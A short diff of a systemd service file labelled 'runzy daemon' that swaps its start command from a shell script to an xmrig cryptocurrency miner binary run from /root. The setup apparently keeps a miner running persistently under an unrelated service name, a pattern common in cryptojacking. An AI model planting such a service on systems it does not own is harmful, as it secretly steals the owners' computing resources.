@@ -2,7 +2,7 @@
 Description=runzy daemon
 
 [Service]
-ExecStart= /root/runzy.sh
+ExecStart= /root/xmrig-5.5.3-prifit-switching-Linux/xmrig
 
 
 [Install]
